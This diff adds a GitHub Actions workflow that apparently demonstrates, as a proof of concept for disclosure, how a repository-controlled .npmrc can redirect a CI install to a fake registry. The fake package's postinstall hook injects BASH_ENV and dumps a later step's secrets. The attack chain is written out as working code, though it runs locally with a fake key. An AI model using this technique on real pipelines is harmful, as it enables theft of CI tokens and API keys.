@@ -1,0 +1,52 @@
+name: poc-npmrc
+on: workflow_dispatch
+
+permissions:
+  contents: read
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Show repo-controlled npmrc (simulates fork PR head file)
+        run: cat .npmrc
+
+      - name: Build + start simulated attacker registry
+        run: |
+          set -euo pipefail
+          echo "npm prefix: $(npm config get prefix)"; echo "npm version: $(npm --version)"
+          echo "registry from repo .npmrc: $(npm config get registry)"; echo "scoped: $(npm config get @anthropic-ai:registry)"
+          rm -rf /tmp/registry /tmp/pkg
+          mkdir -p /tmp/pkg/package /tmp/registry/@anthropic-ai
+          cat > /tmp/pkg/package/package.json <<'EOF'
+          {"name":"@anthropic-ai/claude-code","version":"1.0.0","scripts":{"postinstall":"node -e \"const fs=require('fs');fs.writeFileSync(process.env.GITHUB_WORKSPACE+'/PWNED','postinstall-ran uid='+process.getuid()+' github_token_in_env='+(process.env.GITHUB_TOKEN?'present':'absent'));fs.appendFileSync(process.env.GITHUB_ENV,'BASH_ENV=/tmp/payload.sh\n');fs.writeFileSync('/tmp/payload.sh','echo LEAKED_ENV:$(env | base64 -w0) > /tmp/leaked.txt\n')\""}}
+          EOF
+          tar -czf /tmp/registry/pkg.tgz -C /tmp/pkg package
+          cat > /tmp/registry/@anthropic-ai/claude-code <<'EOF'
+          {"name":"@anthropic-ai/claude-code","dist-tags":{"latest":"1.0.0"},"versions":{"1.0.0":{"name":"@anthropic-ai/claude-code","version":"1.0.0","dist":{"tarball":"http://127.0.0.1:4873/pkg.tgz"}}}}
+          EOF
+          nohup python3 -m http.server 4873 --directory /tmp/registry > /tmp/registry.log 2>&1 &
+          sleep 1
+          echo '--- registry smoke test:'
+          curl -sS http://127.0.0.1:4873/@anthropic-ai/claude-code | head -c 300 || true
+          echo
+
+      - name: Vulnerable step - exact command from claude-code-security-review action
+        run: npm install -g @anthropic-ai/claude-code
+
+      - name: Later privileged step (holds the API key, as the scan step does)
+        env:
+          ANTHROPIC_API_KEY: poc-fake-anthropic-key-0123456789
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: echo "this step thinks it is just scanning"
+
+      - name: Results
+        if: always()
+        run: |
+          echo '--- workspace:'; ls -la
+          echo '--- marker:'; cat PWNED 2>/dev/null || echo "NO MARKER"
+          echo '--- exfiltrated env (base64-decoded, grep for the fake key):'
+          cat /tmp/leaked.txt 2>/dev/null | sed 's/^LEAKED_ENV://' | base64 -d 2>/dev/null | grep -E 'ANTHROPIC_API_KEY|GITHUB_TOKEN' | sed -E 's/(=.{8}).*/\1***/' || echo "NO LEAK FILE"
+          echo '--- registry request log:'; tail -30 /tmp/registry.log 2>/dev/null || true
